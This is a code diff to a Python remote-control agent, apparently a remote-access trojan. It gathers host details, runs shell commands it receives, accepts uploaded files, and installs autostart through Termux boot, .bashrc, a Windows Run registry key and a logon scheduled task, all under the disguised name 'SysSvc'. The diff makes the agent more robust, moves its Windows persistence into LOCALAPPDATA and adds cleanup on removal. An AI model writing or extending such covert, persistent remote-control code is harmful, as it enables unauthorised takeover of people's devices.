@@ -89,10 +89,27 @@ def sh(c, t=90):
         return "ERR %s\n" % e
 
 
+def _cwd():
+    try:
+        return os.getcwd()
+    except Exception:
+        return tempfile.gettempdir()
+
+
+def _pyexe():
+    """Interpreter li kaykhdem: l'embeddable li 7da l'agent, wla sys.executable."""
+    d = os.path.dirname(os.path.abspath(__file__))
+    for n in ("python.exe", "python"):
+        p = os.path.join(d, n)
+        if os.path.isfile(p):
+            return p
+    return sys.executable
+
+
 def info():
     d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
          "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
-         "cwd": os.getcwd(), "pid": os.getpid(), "python": sys.version.split()[0],
+         "cwd": _cwd(), "pid": os.getpid(), "python": sys.version.split()[0],
          "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
     try:
         s = __import__("socket").socket(2, 2)
@@ -589,7 +606,7 @@ def _tmp(prefix):
 def persist():
     home = os.path.expanduser("~")
     self_path = os.path.abspath(__file__)
-    cmd = "%s %s" % (sys.executable, self_path)
+    cmd = "%s %s" % (_pyexe(), self_path)
     done = []
 
     boot_dir = os.path.join(home, ".termux", "boot")
@@ -626,11 +643,12 @@ def persist():
             done.append("bashrc")
 
     if os.name == "nt":
-        d = os.path.join(tempfile.gettempdir(), "svc")
+        base = os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()
+        d = os.path.join(base, "svc")
         os.makedirs(d, exist_ok=True)
         run = os.path.join(d, "run.cmd")
         with open(run, "w") as f:
-            f.write('@echo off\r\nstart "" "%s" "%s"\r\n' % (sys.executable, self_path))
+            f.write('@echo off\r\nstart "" "%s" "%s"\r\n' % (_pyexe(), self_path))
         sh('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc '
            '/t REG_SZ /d "\\"%s\\"" /f' % run)
         sh('schtasks /create /tn SysSvc /tr "\\"%s\\"" /sc onlogon /f' % run)
@@ -679,6 +697,11 @@ def unpersist():
     if os.name == "nt":
         sh('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc /f')
         sh("schtasks /delete /tn SysSvc /f")
+        for base in (os.environ.get("LOCALAPPDATA") or "", tempfile.gettempdir()):
+            try:
+                os.remove(os.path.join(base, "svc", "run.cmd"))
+            except Exception:
+                pass
         done.append("run-key")
 
     return ", ".join(done) or "none"
@@ -687,7 +710,7 @@ def unpersist():
 def run_shell(rid, cmd, limit=120):
     try:
         p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                             stdin=subprocess.DEVNULL, cwd=os.getcwd())
+                             stdin=subprocess.DEVNULL, cwd=_cwd())
     except Exception as e:
         out(rid, "ERR %s\n" % e)
         return
@@ -756,7 +779,7 @@ def handle(m):
             out(rid, "ERR %s\n" % e)
 
     elif t == "pwd":
-        out(rid, os.getcwd() + "\n")
+        out(rid, _cwd() + "\n")
 
     elif t == "ls":
         tg = a or "."
@@ -887,7 +910,7 @@ def handle(m):
     elif t == "put_end":
         e = UPS.pop(m["fid"], None)
         if e:
-            d = os.path.join(os.getcwd(), e["n"])
+            d = os.path.join(_cwd(), e["n"])
             with open(d, "wb") as f:
                 f.write(b"".join(e["b"]))
             out(rid, "saved %s (%d b)\n" % (d, os.path.getsize(d)))
